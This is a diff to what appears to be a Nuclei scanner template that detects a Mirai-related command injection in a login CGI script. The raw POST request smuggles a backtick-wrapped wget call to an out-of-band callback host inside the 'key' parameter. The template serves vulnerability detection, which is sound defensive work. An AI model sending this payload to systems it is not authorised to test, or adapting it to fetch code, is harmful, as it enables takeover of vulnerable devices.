@@ -5,7 +5,7 @@ info:
   author: gy741
   severity: critical
   description: The unknown exploit targets the login CGI script, where a key parameter is not properly sanitized leading to a command injection.
-  reference: |
+  reference:
     - https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
   tags: mirai,rce,oob
 
@@ -13,9 +13,8 @@ requests:
   - raw:
       - |
         POST /cgi-bin/login.cgi HTTP/1.1
-        Connection: keep-alive
+        Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
 
         key=';`wget http://{{interactsh-url}}`;#
 
